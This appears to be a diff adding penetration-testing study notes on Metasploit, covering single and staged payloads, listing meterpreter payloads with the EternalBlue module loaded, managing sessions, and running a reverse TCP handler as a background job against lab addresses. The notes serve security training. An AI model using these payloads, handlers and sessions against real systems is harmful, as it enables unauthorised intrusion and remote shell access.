@@ -1,3 +1,117 @@
+# Payloads
+
+A `Payload` in Metasploit refers to a module that aids the exploit module in (typically) returning a shell to the attacker.
+
+## Single Payloads
+
+A `Single` payload contains the exploit and the entire shellcode for the selected task. Inline payloads are by design more stable than their counterparts because they contain everything all-in-one. However, some exploits will not support the resulting size of these payloads as they can get quite large.
+
+## Staged Payloads
+
+`Stage0` of a staged payload represents the initial shellcode sent over the network to the target machine's vulnerable service, which has the sole purpose of initializing a connection back to the attacker machine.
+
+Stage0 code also aims to read a larger, subsequent payload into memory once it arrives. After the stable communication channel is established between the attacker and the victim, the attacker machine will most likely send an even bigger payload stage which should grant them shell access. This larger payload would be the `Stage1` payload.
+
+## Searching for Payloads
+
+```bash
+msf6 > show payloads
+
+Payloads
+========
+
+   #    Name                                           
+-    ----                                                ---------------  ----    -----  -----------
+   0    aix/ppc/shell_bind_tcp                         <snipped>
+   1    aix/ppc/shell_find_port                        <snipped>
+   2    aix/ppc/shell_interact                         <snipped>
+   3    aix/ppc/shell_reverse_tcp                      <snipped>
+   4    android/meterpreter/reverse_http               <snipped>
+   5    android/meterpreter/reverse_https              <snipped>
+   6    android/meterpreter/reverse_tcp                <snipped>
+   7    android/meterpreter_reverse_http               <snipped>
+   8    android/meterpreter_reverse_https              <snipped>
+   9    android/meterpreter_reverse_tcp                <snipped>
+   10   android/shell/reverse_http                     <snipped>
+   11   android/shell/reverse_https                    <snipped>
+   12   android/shell/reverse_tcp                      <snipped>
+   13   apple_ios/aarch64/meterpreter_reverse_http     <snipped>
+   
+<SNIP>
+   
+```
+
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads
+
+   6   payload/windows/x64/meterpreter/bind_ipv6_tcp          <snipped>
+   7   payload/windows/x64/meterpreter/bind_ipv6_tcp_uuid     <snipped>
+   8   payload/windows/x64/meterpreter/bind_named_pipe        <snipped>
+   9   payload/windows/x64/meterpreter/bind_tcp               <snipped>
+   10  payload/windows/x64/meterpreter/bind_tcp_rc4           <snipped>
+   11  payload/windows/x64/meterpreter/bind_tcp_uuid          <snipped>
+
+```
+
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads
+
+   15  payload/windows/x64/meterpreter/reverse_tcp       <snipper>
+   16  payload/windows/x64/meterpreter/reverse_tcp_rc4   <snipper>
+   17  payload/windows/x64/meterpreter/reverse_tcp_uuid  <snipper>
+   
+   
+msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter grep reverse_tcp show payloads
+```
+# Sessions
+
+While running any available exploits or auxiliary modules in msfconsole, we can background the session as long as they form a channel of communication with the target host. This can be done either by pressing the `[CTRL] + [Z]` key combination or by typing the `background` command in the case of Meterpreter stages.
+
+## Listing Active Sessions
+
+```bash
+msf6 exploit(windows/smb/psexec_psh) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                 Connection
+  --  ----  ----                     -----------                 ----------
+  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -> 10.10.10.205:50501 (10.10.10.205)
+```
+
+You can use the `sessions -i [no.]` command to open up a specific session.
+
+```bash
+msf6 exploit(windows/smb/psexec_psh) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > 
+```
+
+## Running an Exploit as a Background Job
+
+```bash
+msf6 exploit(multi/handler) > exploit -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 10.10.14.34:4444
+```
+
+## Listing Running Jobs
+
+```bash
+msf6 exploit(multi/handler) > jobs -l
+
+Jobs
+====
+
+ Id  Name                    Payload                    Payload opts
+ --  ----                    -------                    ------------
+ 0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.10.14.34:4444
+```
+
 # Meterpreter
 
 ## Searching for exploit
